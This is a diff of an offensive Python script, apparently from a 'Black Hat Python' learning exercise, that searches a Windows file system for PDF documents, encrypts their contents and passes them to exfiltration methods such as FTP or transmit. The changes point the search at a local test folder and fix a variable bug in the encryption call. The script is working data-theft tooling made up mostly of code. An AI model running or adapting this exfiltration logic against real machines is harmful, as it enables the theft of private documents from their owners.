@@ -17,7 +17,7 @@ EXFIL = {
   
 def find_docs(doc_type='pdf'):
     # Walks through the file system, looking for PDFs
-    for parent, _, filenames in os.walk('c:\\'):
+    for parent, _, filenames in os.walk('C:\\Users\\User\\Documents\\Prog\\BlackHat_Python\\TestFolder'):
         for filename in filenames:
             if filename.endswith(doc_type):
                 document_path = os.path.join(parent, filename)
@@ -26,7 +26,7 @@ def find_docs(doc_type='pdf'):
 
 def exfiltrate(document_path, method):
     if method in['transmit', 'plain_ftp']: # Pass exfil method and doc path
-        filename = f'c:\\windows\\temp\\{os.path.basename(document_path)}'
+        filename = f'C:\\Users\\User\\Documents\\Prog\\BlackHat_Python\\TestFolder\\{os.path.basename(document_path)}'
         with open(document_path, 'rb') as f0: # New encoded file
             content = f0.read()
         with open(filename, 'wb') as f1:
@@ -39,7 +39,7 @@ def exfiltrate(document_path, method):
         with open(document_path, 'rb') as f:
             contents = f.read()
         title = os.path.basename(document_path)
-        content =  encrypt(content) # enccrypt the contents
+        content =  encrypt(contents) # enccrypt the contents
         EXFIL[method](title, content) # call exfil method
 
 if __name__=='__main__':
